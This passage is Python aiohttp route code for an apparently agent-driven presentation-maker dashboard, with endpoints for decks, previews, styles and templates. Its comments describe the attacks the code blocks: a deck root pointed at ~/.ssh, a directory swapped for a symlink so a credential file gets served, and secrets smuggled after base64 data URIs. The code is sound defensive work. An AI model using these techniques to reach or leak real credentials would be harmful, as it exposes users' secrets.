            _icon_marker_path(target),
            json.dumps(
                {
                    "tag": tag,
                    "sources": {
                        source: bool(succeeded.get(source)) for source, _ in engine.ICON_SOURCES
                    },
                },
                indent=2,
            )
            + "\n",
        )
    except OSError as exc:
        logger.debug("pptx-maker: icon marker write failed: %s", exc)

    complete = all(succeeded.get(source) for source, _ in engine.ICON_SOURCES)
    with _assets_lock:
        _assets_state.state = "done" if complete else "error"
        _assets_state.log = "\n".join(lines)


async def _handle_assets(request: web.Request) -> web.Response:
    """GET /assets — icon-pack provisioning status."""
    return web.json_response(await off_loop(_assets_status))


async def _handle_assets_provision(request: web.Request) -> web.Response:
    """POST /assets/provision[?force=true] — start the icon-pack download.

    Fire-and-forget: presentations work without icon packs, so the UI polls
    ``/assets`` for progress rather than holding a request open for the download.
    """
    with _assets_lock:
        if _assets_state.state == "running":
            return web.json_response({"state": "running"}, status=202)
        _assets_state.state = "running"
        _assets_state.log = ""
        _assets_state.started = time.time()
        _assets_state.per_source = {}
    force = request.query.get("force") == "true"
    _audit("assets_provision", f"force={force}", "started")
    # Detached: the caller gets 202 immediately. The task is not awaited, so a
    # failure inside it is recorded in the provisioning state (which the UI
    # polls) rather than surfacing as an unhandled exception.
    asyncio.ensure_future(off_loop(_provision_assets, force))
    return web.json_response({"state": "running"}, status=202)


# ── deck output directory ───────────────────────────────────────────────────


async def _handle_get_config(request: web.Request) -> web.Response:
    """GET /config — the resolved deck output directory."""
    root = await off_loop(paths.deck_root)
    return web.json_response({"deckRoot": str(root), "default": paths.SEEDED_DECK_ROOT})


def _write_deck_root(deck_root: str) -> tuple[int, dict]:
    """Persist ``output_dir`` into the engine's own config.

    Written into the ENGINE's config rather than a private file of ours so the
    engine and this app can never disagree about where decks live — the engine is
    what actually writes them.

    The value is RESOLVED before it is stored, because storing it is what makes a
    bad value permanent. ``paths.deck_root()`` resolves the configured string on
    every read, and ``Path.resolve()`` raises ``ValueError`` for a path holding an
    embedded NUL — so accepting one here wedged the app: this endpoint answered
    200, and every later ``GET /config`` and every deck route then raised out of
    ``deck_root()`` as a 500, including the settings page needed to correct it. The
    only recovery was editing the engine's config file by hand.

    Rejecting it costs the user one 400 on a value that could never have worked.

    A CREDENTIAL DIRECTORY is refused here, and this is a WRITE boundary, not a read
    one. ``paths.deck_root()`` is only how *this app* reads the setting; the value
    stored here is the engine's own ``output_dir``, and the engine resolves it
    independently and calls ``mkdir(parents=True)`` plus writes ``deck.json`` /
    ``specs/`` / ``slides/`` under it. So a ``deckRoot`` of ``~/.ssh`` does not merely
    expose that directory — it makes a third-party tree, driven by model-authored
    deck content, CREATE FILES inside it (and where the directory does not yet exist,
    mint it at 0o755, which is itself an SSH-refusal hazard). Nothing downstream can
    undo that: the per-deck ``paths._contained`` gate refuses to *display* anything
    under a sensitive root, so the decks would accumulate in the credential directory
    while ``GET /decks`` reported an empty list — silent, invisible writes.

    Both predicates are needed and neither subsumes the other: ``is_sensitive_path``
    catches the directory itself and anything beneath it (``~/.ssh``,
    ``~/.ssh/decks``), while ``path_contains_sensitive`` catches a root that would
    make decks SIBLINGS of a credential directory — bare ``~`` is not itself
    sensitive, so without the second check it is accepted.

    BLOCKING — call through ``off_loop``.
    """
    # An embedded NUL makes a path unusable, but Path.resolve() only RAISES on
    # it on POSIX — on Windows it silently returns a bogus path, so resolve()'s
    # own except never fires and the wedge slips through. Reject NUL explicitly
    # up front so the check holds on every OS.
    if not deck_root or "\x00" in deck_root:
        logger.warning("pptx-maker: refused an empty or NUL-containing deck root")
        return 400, {
            "error": "that deck folder is not a usable path",
            "code": "invalid_deck_root",
        }
    try:
        # Same expansion order as `paths.deck_root`, so what is validated is what
        # will later be resolved — checking a differently-derived path would leave
        # the gap open.
        resolved = Path(deck_root).expanduser().resolve()
    except (ValueError, OSError) as exc:
        logger.warning("pptx-maker: refused an unresolvable deck root: %s", type(exc).__name__)
        return 400, {
            "error": "that deck folder is not a usable path",
            "code": "invalid_deck_root",
        }
    if is_sensitive_path(str(resolved)) or path_contains_sensitive(str(resolved)):
        # Deliberately not logged with the path: the refusal is the signal, and the
        # value is user-supplied text that would land in the gateway log verbatim.
        logger.warning("pptx-maker: refused a deck root on or containing a sensitive path")
        return 400, {
            "error": "that deck folder is not a usable path",
            "code": "invalid_deck_root",
        }
    deck_root = str(resolved)
    config_path = paths.engine_config_path()
    if config_path.exists():
        config = paths.read_engine_config()
        if not config:
            return 409, {
                "error": "the existing engine config is not valid JSON",
                "code": "engine_config_corrupt",
            }
    else:
        config = {}
    config["output_dir"] = deck_root
    try:
        config_path.parent.mkdir(parents=True, exist_ok=True)
        atomic_write(config_path, json.dumps(config, ensure_ascii=False, indent=2) + "\n")
    except OSError as exc:
        logger.warning("pptx-maker: deck-root write failed: %s", exc)
        return 500, {
            "error": "could not save the engine config",
            "code": "engine_config_write_failed",
        }
    return 200, {"saved": True, "deckRoot": str(Path(deck_root).expanduser())}


async def _handle_put_config(request: web.Request) -> web.Response:
    """PUT /config {"deckRoot": "<path>"} — set the deck output directory.

    ``deckRoot`` is the ONLY writable key: the body is checked for exact key
    equality rather than merged, so this endpoint cannot be used to set an
    arbitrary engine option.
    """
    body, error = await _json_body(request)
    if error is not None:
        return error
    assert body is not None
    if set(body) != {"deckRoot"}:
        return web.json_response(
            {"error": "only 'deckRoot' may be updated", "code": "unexpected_config_key"}, status=400
        )
    deck_root = body.get("deckRoot")
    if not isinstance(deck_root, str) or not deck_root.strip():
        return web.json_response(
            {"error": "'deckRoot' must be a non-empty string", "code": "invalid_deck_root"},
            status=400,
        )
    status, payload = await off_loop(_write_deck_root, deck_root.strip())
    _audit("set_deck_root", deck_root.strip(), "ok" if status == 200 else "failed")
    return _worker_response(status, payload)


# ── decks ───────────────────────────────────────────────────────────────────


async def _handle_decks(request: web.Request) -> web.Response:
    """GET /decks — every deck under the deck root."""
    return web.json_response({"decks": await off_loop(decks.list_decks)})


async def _handle_deck_detail(request: web.Request) -> web.Response:
    """GET /deck?id=<deckId> — one deck's deliverables and slides."""
    deck_id = _query_name(request, "id")
    if not deck_id:
        return web.json_response({"error": "missing ?id=", "code": "missing_deck_id"}, status=400)
    detail = await off_loop(decks.deck_detail, deck_id)
    if detail is None:
        return web.json_response({"error": "deck not found", "code": "deck_not_found"}, status=404)
    return web.json_response(detail)


def _redact_artifact(raw: bytes) -> bytes:
    """Redact a TEXTUAL deck artifact's bytes before they are served.

    Every textual artifact this route serves — the brief and outline (`.md`), the
    art-direction board (`.html`), the compose payloads and shared defs (`.json`),
    any `.svg` — is written by the presentation-engine agent from model output, so
    it is agent-authored content on its way to a user surface. That is exactly the
    boundary ``security.redact`` exists for, and the app already applies it to the
    two other places deck content reaches the dashboard (``decks._deck_name`` and
    ``decks._read_brief``). Serving these raw made the preview route an
    inconsistent hole through which a credential in a generated artifact reached
    the browser verbatim.

    Decoded with ``errors="replace"`` and re-encoded to UTF-8: a malformed byte
    sequence must DEGRADE (a replacement char) rather than raise, because this
    runs on a worker thread where an escaping ``UnicodeDecodeError`` would become
    an opaque 500 instead of the artifact the user asked for.

    Inline raster art is excised around the pass — see ``_INLINE_BITMAP_RE`` for
    why that is required rather than merely convenient.

    Redaction CHANGES the byte length. That is fine here and deliberately so: the
    ``MAX_ARTIFACT_BYTES`` cap is applied to the READ (before this runs), which is
    the resource being bounded, and the response sets no ``Content-Length`` of its
    own — aiohttp derives it from the final body.

    BLOCKING (pure CPU over a bounded string) — runs inside :func:`_read_artifact`
    so it stays on the ``off_loop`` worker and never on the event loop.
    """
    stash: list[str] = []

    def _stash(match: re.Match[str]) -> str:
        # A `data:image/...` label is agent-authored, so it is a claim: excise only
        # a blob whose bytes really start like a raster. Anything else stays in the
        # text and gets scanned like ordinary prose.
        appended = match.group(2) or ""
        if appended:
            # The URI does not end where the base64 does, so something is glued to it.
            # Excise the body AND the whole appended run: a credential appended here
            # splits at its own separator, the prefix landing in the BODY and surviving
            # the re-encode, so dropping only the body leaves the rest of the secret in
            # the text — a PyPI macaroon lost its `pypi-` prefix and served 49 chars of
            # body. Handing the region to the text pass does not help either: the
            # bare-secret heuristic eats the base64 run and stops at the separator.
            #
            # This deletes text in the (unattested) case where the run is innocent, but
            # a `-`/`.`/`:`-led run glued to a data URI is not a shape the engine emits,
            # the deletion is signposted by the tag rather than silent, and the
            # alternative is serving credential material. The TERMINATOR is not part of
            # the match, so the surrounding document keeps its quote or bracket.
            prefix = match.group(0)[: match.start(1) - match.start(0)]
            return prefix + REDACTED_CREDENTIAL_TAG
        scanned, credential = _scanned_bitmap_bytes(match.group(1))
        if scanned is None:
            if credential:
                # Excise rather than hand back: the text pass only removes tokens
                # `redact()` itself recognises, which is a NARROWER set than this
                # scan matches, so delegating served the ones it does not know. A
                # credential-bearing "image" is not one worth rendering anyway.
                prefix = match.group(0)[: match.start(1) - match.start(0)]
                return prefix + REDACTED_CREDENTIAL_TAG
            return match.group(0)
        # Stash a RE-ENCODING of the bytes that were actually scanned, never
        # `match.group(0)`. Restoring the original matched text is what let a
        # credential appended after the base64 padding survive: the decoder ignored
        # it, so the scan never saw it, but the restore put it back verbatim. Round-
        # tripping through the validated bytes makes the exemption cover exactly what
        # was cleared — anything the decoder discarded is discarded here too.
        #
        # The prefix is taken from the match rather than rebuilt so the media type and
        # any parameters the engine emitted are preserved; only the BODY is replaced.
        # Anything the decoder did not consume (data after the padding) is dropped with
        # it, which is the point — it was never scanned, so it must not be restored.
        prefix = match.group(0)[: match.start(1) - match.start(0)]
        stash.append(prefix + base64.b64encode(scanned).decode("ascii"))
        return f"\x00KIROCREW-BITMAP-{_BITMAP_PLACEHOLDER_NONCE}-{len(stash) - 1}\x00"

    def _restore(match: re.Match[str]) -> str:
        index = int(match.group(1))
        # A forged placeholder (or one whose index the redactor mangled) restores
        # to nothing rather than to attacker-chosen bytes.
        return stash[index] if index < len(stash) else ""

    text = raw.decode("utf-8", errors="replace")
    cleaned = redact(_INLINE_BITMAP_RE.sub(_stash, text))
    return _BITMAP_PLACEHOLDER_RE.sub(_restore, cleaned).encode("utf-8")


def _read_artifact(deck_id: str, subpath: str) -> tuple[bytes, str] | None:
    """Read one deck artifact, or ``None`` when it is not a servable file.

    Containment is ``paths.resolve_deck_file``'s job; this adds the extension
    allow-list, the size cap, and — for a textual suffix — the redaction pass.
    BLOCKING — call through ``off_loop``.
    """
    deck_dir = paths.resolve_deck_dir(deck_id)
    if deck_dir is None:
        return None
    resolved = paths.resolve_deck_file(deck_id, subpath)
    if resolved is None:
        return None
    served = SERVED_SUFFIXES.get(resolved.suffix.lower())
    if served is None:
        return None
    # Read through the gateway's own `safe_read_file_bytes_nolink`, pinned to the
    # deck directory as `within_root`.
    #
    # `resolve_deck_file` canonicalizes with `realpath` and re-checks containment, but
    # that verdict is about the path as it was THEN — and the deck root is
    # AGENT-WRITTEN, so the tree can change underneath it. A bare
    # `os.open(..., O_NOFOLLOW)` is not enough here, because `O_NOFOLLOW` only makes
    # the FINAL component's symlink-ness fatal: an INTERMEDIATE directory swapped for
    # a symlink between the resolve and the open still escapes. Demonstrated —
    # replacing `compose/` with a link to a credential directory after resolution
    # served that directory's `config.json` to the browser.
    #
    # This helper closes the window the only way it can be closed: it opens first,
    # then resolves the OPENED DESCRIPTOR's real path (`/proc/self/fd` on Linux,
    # `F_GETPATH` on macOS) and requires that to sit inside `within_root` — so the
    # inode validated is exactly the inode read, with no check-to-use gap. It also
    # rejects hardlinked and non-regular files and fails closed when the fd's path
    # cannot be determined. Its documented R33 F1 case IS this attack.
    #
    # `resolve_deck_dir` is called separately for the root rather than derived from
    # `resolved.parent`: a root taken from the very path under attack would be
    # whatever the swap pointed at, which would validate the escape against itself.
    # Oversize RAISES `FileTooLargeError` here rather than returning `None` (the
    # previous inline read compared `fstat` and returned `None`), so it is caught and
    # mapped back to the same "not servable" answer every other rejection gives.
    try:
        raw = hooks.safe_read_file_bytes_nolink(
            str(resolved), within_root=str(deck_dir), max_bytes=MAX_ARTIFACT_BYTES
        )
    except FileTooLargeError:
        return None
    if raw is None:
        return None
    if served.text:
        return _redact_artifact(raw), served.content_type
    # Binary artifacts are returned byte-identical: a .pptx is a zip and a .png a
    # compressed bitmap, so rewriting a byte inside either corrupts the deck.
    return raw, served.content_type


async def _handle_preview(request: web.Request) -> web.StreamResponse:
    """GET /preview/{deckId}/{subpath} — a deck artifact (JSON, PNG, MD, PPTX).

    The path is resolved through ``paths.resolve_deck_file``, which allow-lists
    every segment and re-checks containment after symlink resolution, so a
    crafted ``subpath`` cannot read outside the requested deck's directory.

    This is the ONLY path by which a deck artifact's bytes reach a browser: the
    body is what :func:`_read_artifact` returned, and there is deliberately no
    ``web.FileResponse``/``sendfile`` leg that would re-open the file and bypass
    that helper's allow-list, size cap and redaction pass. Keep it that way.
    """
    deck_id = request.match_info.get("deck_id", "")
    subpath = request.match_info.get("subpath", "")
    artifact = await off_loop(_read_artifact, deck_id, subpath)
    if artifact is None:
        _audit("artifact_read", f"{deck_id}/{subpath}", "denied")
        return web.json_response({"error": "not found", "code": "artifact_not_found"}, status=404)
    data, content_type = artifact
    # Content-Type is set through the HEADER rather than the ``content_type=``
    # kwarg (aiohttp refuses a charset there) so the FULL declared value survives,
    # charset included. That matters now that a textual artifact is re-encoded to
    # UTF-8 by the redaction pass: the declared charset is what the body actually
    # is. ``Content-Length`` is deliberately NOT set here — aiohttp derives it from
    # the final body, so it can never be a stale pre-redaction size.
    headers = {
        "Content-Type": content_type,
        "Cache-Control": NO_STORE,
        "X-Content-Type-Options": "nosniff",
    }
    if content_type.startswith(_SCRIPT_CAPABLE_CONTENT_TYPES):
        headers["Content-Security-Policy"] = _ARTIFACT_HTML_CSP
    return web.Response(body=data, headers=headers)


# ── styles ──────────────────────────────────────────────────────────────────


def _redact_metadata(entry: dict) -> dict:
    """Redact every STRING value in a library entry, recursively.

    The `coverHtml` pass below covers the document body; this covers the fields
    beside it. A style's `name` and a template's `description` are agent-authored
    too — `POST /styles/import?name=` and `/templates/import?description=` are
    both agent-reachable — so redacting only the HTML left a credential in a name
    reaching the Library tab unscanned, which is the same one-field-missed shape as
    the thumbnail hole this helper was originally written for.

    Applies to nested dicts/lists because the analyzed template metadata is a tree
    (`theme`, `layouts`), and to the KEY-BEARING values only: keys themselves are
    fixed schema names, never agent text.
    """

    def _clean(value: object) -> object:
        if isinstance(value, str):
            return redact(value)
        if isinstance(value, dict):
            return {k: _clean(v) for k, v in value.items()}
        if isinstance(value, list):
            return [_clean(v) for v in value]
        return value

    return {key: _clean(value) for key, value in entry.items()}


def _redacted_template_list() -> list[dict]:
    """The template library with every string field redacted. BLOCKING.

    `list_templates` returns analyzed metadata for user-imported templates, whose
    `name` and `description` arrive from the agent-reachable import route. Nothing
    here was scanned before, so this route served them verbatim.
    """
    return [_redact_metadata(t) for t in library.list_templates() if isinstance(t, dict)]


def _redacted_style_list() -> list[dict]:
    """The style library with every `coverHtml` redacted. BLOCKING.

    `coverHtml` is a SLICE OF THE SAME agent-authored file `/style` serves whole, so
    redacting one route and not the other left the identical bytes reachable through
    the thumbnail — and the thumbnail is the one every visit to the Library tab
    loads. Same helper as the full document, for the same reason: a style embeds
    inline `data:` art, and an unguarded `redact()` eats a raster as a bare secret.
    """
    styles = []
    for style in library.list_styles():
        if not isinstance(style, dict):
            continue
        cover = style.get("coverHtml")
        # Metadata through the generic pass; `coverHtml` through the bitmap-aware
        # one, because a style embeds inline `data:` art and a plain `redact()`
        # eats a raster as a bare secret. Metadata first, then the cover is
        # replaced, so the document body is never double-scanned.
        entry = _redact_metadata(style)
        if isinstance(cover, str) and cover:
            entry["coverHtml"] = _redact_artifact(cover.encode("utf-8")).decode("utf-8")
        styles.append(entry)
    return styles


async def _handle_styles(request: web.Request) -> web.Response:
    """GET /styles — the style library with per-style cover thumbnails."""
    return web.json_response({"styles": await off_loop(_redacted_style_list)})


async def _handle_style(request: web.Request) -> web.Response:
    """GET /style?name=<n> — one style's full HTML."""
    name = _query_name(request)
    if not name:
        return web.json_response({"error": "missing ?name=", "code": "missing_name"}, status=400)
    html = await off_loop(library.style_html, name)
    if html is None:
        return web.json_response(
            {"error": "style not found", "code": "style_not_found"}, status=404
        )
    # Redacted for the same reason a textual deck artifact is: a style is an HTML
    # document AUTHORED BY AN AGENT — `pptx-maker-style`'s entire job is to write one,
    # and it holds `web_fetch`/`web_search` — so it is model output on its way to
    # the dashboard, not inert user upload. (A user CAN import a style by hand via
    # `POST /styles/import`, which is what makes this easy to misfile; the agent
    # path exists too, so the boundary has to assume the untrusted one.)
    #
    # Through `_redact_artifact` rather than a bare `redact()`: a style embeds the
    # same `data:image/...;base64,` art as a compose payload, and an unguarded pass
    # over a raster reliably eats it as a bare secret — which would silently blank
    # the style preview. That helper is the one place that gets this right.
    redacted = await off_loop(_redact_artifact, html.encode("utf-8"))
    return web.json_response({"name": name, "fullHtml": redacted.decode("utf-8")})


async def _handle_style_import(request: web.Request) -> web.Response:
    """POST /styles/import?name=<n> — create a user style from the raw body."""
    name = _query_name(request)
    body = await _read_body(request)
    if body is None:
        return web.json_response(
            {"error": "style file is too large", "code": "payload_too_large"}, status=413
        )
    status, payload = await off_loop(library.import_style, name, body.decode("utf-8", "replace"))
    _audit("style_import", name, "ok" if status == 200 else "failed")
    return _worker_response(status, payload)


async def _handle_style_rename(request: web.Request) -> web.Response:
    """POST /styles/rename {"name","to"} — rename a user style."""
    body, error = await _json_body(request)
    if error is not None:
        return error
    assert body is not None
    name = str(body.get("name") or "").strip()
    new_name = str(body.get("to") or "").strip()
    status, payload = await off_loop(library.rename_style, name, new_name)
    _audit("style_rename", f"{name}->{new_name}", "ok" if status == 200 else "failed")
    return _worker_response(status, payload)


async def _handle_style_pin(request: web.Request) -> web.Response:
    """POST /styles/pin {"name","pinned"} — pin or unpin a style."""
    body, error = await _json_body(request)
    if error is not None:
        return error
    assert body is not None
    name = str(body.get("name") or "").strip()
    pinned = body.get("pinned")
    if not isinstance(pinned, bool):
        return web.json_response(
            {"error": "'pinned' must be a boolean", "code": "invalid_pinned"}, status=400
        )
    status, payload = await off_loop(library.pin_style, name, pinned)
    return _worker_response(status, payload)


async def _handle_style_delete(request: web.Request) -> web.Response:
    """DELETE /styles?name=<n> — delete a user style."""
    name = _query_name(request)
    status, payload = await off_loop(library.delete_style, name)
    _audit("style_delete", name, "ok" if status == 200 else "failed")
    return _worker_response(status, payload)


# ── templates ───────────────────────────────────────────────────────────────


async def _handle_templates(request: web.Request) -> web.Response:
    """GET /templates — the template library with analyzed theme metadata."""
    return web.json_response({"templates": await off_loop(_redacted_template_list)})


async def _handle_template_import(request: web.Request) -> web.Response:
    """POST /templates/import?name=<n>[&description=] — create a user template."""
    name = _query_name(request)
    description = (request.query.get("description") or "").strip()
    body = await _read_body(request)
    if body is None:
        return web.json_response(
            {"error": "template file is too large", "code": "payload_too_large"}, status=413
        )
    status, payload = await off_loop(library.import_template, name, body, description)
    _audit("template_import", name, "ok" if status == 200 else "failed")
    return _worker_response(status, payload)


async def _handle_template_rename(request: web.Request) -> web.Response:
    """POST /templates/rename {"name","to"} — rename a user template."""
    body, error = await _json_body(request)
    if error is not None:
        return error
    assert body is not None
    name = str(body.get("name") or "").strip()
    new_name = str(body.get("to") or "").strip()
    status, payload = await off_loop(library.rename_template, name, new_name)
    _audit("template_rename", f"{name}->{new_name}", "ok" if status == 200 else "failed")
    return _worker_response(status, payload)


async def _handle_template_delete(request: web.Request) -> web.Response:
    """DELETE /templates?name=<n> — delete a user template."""
    name = _query_name(request)
    status, payload = await off_loop(library.delete_template, name)
    _audit("template_delete", name, "ok" if status == 200 else "failed")
    return _worker_response(status, payload)


# ── registration ────────────────────────────────────────────────────────────


def register_routes(app: web.Application) -> None:
    """Register this app's routes on the gateway's aiohttp Application.

    Signature matches every other builtin app (see
    ``issue_radar/backend/routes.py``): one argument, hardcoded paths, called by
    ``dashboard/server.py`` as ``_mod.register_routes(app)``.
    """
    # Register the OOXML type so a downloaded .pptx carries the right
    # Content-Type on hosts whose mimetypes database lacks it.
    mimetypes.add_type(SERVED_SUFFIXES[".pptx"].content_type, ".pptx")

    app.router.add_get(f"{API_PREFIX}/engine", _require_enabled(_handle_engine))
    app.router.add_post(
        f"{API_PREFIX}/engine/provision", _require_enabled(_handle_engine_provision)
    )
    app.router.add_get(f"{API_PREFIX}/deps", _require_enabled(_handle_deps))
    app.router.add_get(f"{API_PREFIX}/assets", _require_enabled(_handle_assets))
    app.router.add_post(
        f"{API_PREFIX}/assets/provision", _require_enabled(_handle_assets_provision)
    )
    app.router.add_get(f"{API_PREFIX}/config", _require_enabled(_handle_get_config))
    app.router.add_put(f"{API_PREFIX}/config", _require_enabled(_handle_put_config))
    app.router.add_get(f"{API_PREFIX}/decks", _require_enabled(_handle_decks))
    app.router.add_get(f"{API_PREFIX}/deck", _require_enabled(_handle_deck_detail))
    app.router.add_get(
        API_PREFIX + "/preview/{deck_id}/{subpath:.*}", _require_enabled(_handle_preview)
    )
    app.router.add_get(f"{API_PREFIX}/styles", _require_enabled(_handle_styles))
    app.router.add_get(f"{API_PREFIX}/style", _require_enabled(_handle_style))
    app.router.add_post(f"{API_PREFIX}/styles/import", _require_enabled(_handle_style_import))
    app.router.add_post(f"{API_PREFIX}/styles/rename", _require_enabled(_handle_style_rename))
    app.router.add_post(f"{API_PREFIX}/styles/pin", _require_enabled(_handle_style_pin))
    app.router.add_delete(f"{API_PREFIX}/styles", _require_enabled(_handle_style_delete))
    app.router.add_get(f"{API_PREFIX}/templates", _require_enabled(_handle_templates))
    app.router.add_post(f"{API_PREFIX}/templates/import", _require_enabled(_handle_template_import))
    app.router.add_post(f"{API_PREFIX}/templates/rename", _require_enabled(_handle_template_rename))
    app.router.add_delete(f"{API_PREFIX}/templates", _require_enabled(_handle_template_delete))
